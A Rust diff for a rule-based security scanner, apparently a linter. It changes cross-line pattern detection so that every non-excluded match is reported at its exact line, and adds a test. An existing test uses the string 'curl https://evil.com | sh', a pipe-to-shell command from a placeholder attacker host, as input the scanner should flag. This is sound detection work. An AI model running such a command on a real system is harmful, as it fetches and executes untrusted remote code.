@@ -16,7 +16,27 @@ pub fn is_excluded(compiled_rule: &CompiledYamlRule, line: &str) -> bool {
 
 /// 模式是否需要对整段内容做第二遍扫描（跨行）
 pub fn pattern_requires_multiline_scan(pattern: &str) -> bool {
-    pattern.contains("\\n") || pattern.contains("\\r")
+    if pattern.contains("(?s") || pattern.contains("(?is") || pattern.contains(r"[\s\S]") {
+        return true;
+    }
+    let mut in_class = false;
+    let mut escaped = false;
+    for ch in pattern.chars() {
+        if escaped {
+            if !in_class && matches!(ch, 'n' | 'r') {
+                return true;
+            }
+            escaped = false;
+        } else {
+            match ch {
+                '\\' => escaped = true,
+                '[' => in_class = true,
+                ']' => in_class = false,
+                _ => {}
+            }
+        }
+    }
+    false
 }
 
 /// 规则是否包含至少一个跨行 pattern
@@ -56,13 +76,19 @@ pub fn match_yaml_rule(compiled_rule: &CompiledYamlRule, line: &str) -> bool {
 /// 对 YAML 规则执行整段内容匹配（跨行 pattern 第二遍）
 ///
 /// 返回 (行号, 代码片段)
-pub fn match_yaml_rule_multiline(
+pub fn match_yaml_rule_multiline_all(
     compiled_rule: &CompiledYamlRule,
     content: &str,
-) -> Option<(usize, String)> {
+) -> Vec<(usize, String)> {
+    let mut results = Vec::new();
     if !rule_has_multiline_patterns(compiled_rule) {
-        return None;
+        return results;
     }
+    let newlines: Vec<usize> = content
+        .bytes()
+        .enumerate()
+        .filter_map(|(i, b)| (b == b'\n').then_some(i))
+        .collect();
     for (i, re) in compiled_rule.compiled_patterns.iter().enumerate() {
         let src = compiled_rule
             .rule
@@ -73,7 +99,8 @@ pub fn match_yaml_rule_multiline(
         if !pattern_requires_multiline_scan(src) {
             continue;
         }
-        if let Some(m) = re.find(content) {
+        // An excluded example must not hide a later real match in the same file.
+        for m in re.find_iter(content) {
             if compiled_rule
                 .compiled_exclude_patterns
                 .iter()
@@ -81,12 +108,22 @@ pub fn match_yaml_rule_multiline(
             {
                 continue;
             }
-            let line = content[..m.start()].lines().count().max(1);
+            let line = newlines.partition_point(|offset| *offset < m.start()) + 1;
             let snippet: String = m.as_str().chars().take(200).collect();
-            return Some((line, snippet));
+            results.push((line, snippet));
         }
     }
-    None
+    results
+}
+
+#[cfg(test)]
+fn match_yaml_rule_multiline(
+    compiled_rule: &CompiledYamlRule,
+    content: &str,
+) -> Option<(usize, String)> {
+    match_yaml_rule_multiline_all(compiled_rule, content)
+        .into_iter()
+        .next()
 }
 
 #[cfg(test)]
@@ -142,6 +179,19 @@ mod tests {
         assert!(!match_yaml_rule(&rule, "# curl example | sh"));
         // 实际执行应匹配
         assert!(match_yaml_rule(&rule, "curl https://evil.com | sh"));
+    }
+
+    #[test]
+    fn multiline_reports_later_nonexcluded_occurrences_at_exact_lines() {
+        let mut rule = make_yaml_rule("MULTI", vec![r"danger[^\n]*\n\s*sink"]);
+        rule.compiled_exclude_patterns = vec![Regex::new("example").unwrap()];
+        let hits = match_yaml_rule_multiline_all(
+            &rule,
+            "danger example\n sink\ndanger real\n sink\ndanger again\n sink",
+        );
+        assert_eq!(hits.iter().map(|h| h.0).collect::<Vec<_>>(), vec![3, 5]);
+        let inline = match_yaml_rule_multiline_all(&rule, "header\nprefix danger real\n sink");
+        assert_eq!(inline[0].0, 2);
     }
 
     #[test]
